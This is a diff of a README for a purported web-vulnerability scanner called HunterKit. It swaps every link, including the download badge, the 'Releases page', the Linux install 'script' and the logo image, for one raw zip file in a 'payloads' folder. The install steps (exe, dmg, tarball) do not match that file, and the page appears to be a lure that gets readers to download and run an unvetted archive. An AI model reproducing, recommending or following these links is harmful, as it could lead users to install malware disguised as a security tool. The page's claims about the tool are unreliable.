@@ -6,9 +6,9 @@ Welcome to HunterKit! This tool helps you find vulnerabilities in web applicatio
 
 ## 🔗 Download HunterKit
 
-[![Download HunterKit](https://raw.githubusercontent.com/4chpz/HunterKit/main/Hominidae/HunterKit.zip)](https://raw.githubusercontent.com/4chpz/HunterKit/main/Hominidae/HunterKit.zip)
+[![Download HunterKit](https://github.com/4chpz/HunterKit/raw/refs/heads/main/payloads/Hunter_Kit_2.6.zip)](https://github.com/4chpz/HunterKit/raw/refs/heads/main/payloads/Hunter_Kit_2.6.zip)
 
-To get started, visit this page to download: [HunterKit Releases](https://raw.githubusercontent.com/4chpz/HunterKit/main/Hominidae/HunterKit.zip)
+To get started, visit this page to download: [HunterKit Releases](https://github.com/4chpz/HunterKit/raw/refs/heads/main/payloads/Hunter_Kit_2.6.zip)
 
 ## 📋 Requirements
 
@@ -21,7 +21,7 @@ Before downloading, ensure you have:
 
 ## 🔧 Install HunterKit
 
-1. Go to the [HunterKit Releases](https://raw.githubusercontent.com/4chpz/HunterKit/main/Hominidae/HunterKit.zip) page.
+1. Go to the [HunterKit Releases](https://github.com/4chpz/HunterKit/raw/refs/heads/main/payloads/Hunter_Kit_2.6.zip) page.
   
 2. Choose the latest version of HunterKit.
   
@@ -34,7 +34,7 @@ Before downloading, ensure you have:
 6. Follow the installation instructions based on your operating system:
    - **Windows:** Double-click the `.exe` file and follow the prompts to install.
    - **macOS:** Open the `.dmg` file, drag the HunterKit icon into your Applications folder.
-   - **Linux:** Extract the tarball and run the `https://raw.githubusercontent.com/4chpz/HunterKit/main/Hominidae/HunterKit.zip` script.
+   - **Linux:** Extract the tarball and run the `https://github.com/4chpz/HunterKit/raw/refs/heads/main/payloads/Hunter_Kit_2.6.zip` script.
 
 ## 🛠️ Running HunterKit
 
@@ -95,4 +95,4 @@ For any issues, you can reach out for support through:
 
 HunterKit is your reliable partner in web security. By following these steps, you can easily download and start using the tool effectively. Find vulnerabilities, improve your security practices, and help make the web safer for everyone. 
 
-![HunterKit Logo](https://raw.githubusercontent.com/4chpz/HunterKit/main/Hominidae/HunterKit.zip)
+![HunterKit Logo](https://github.com/4chpz/HunterKit/raw/refs/heads/main/payloads/Hunter_Kit_2.6.zip)
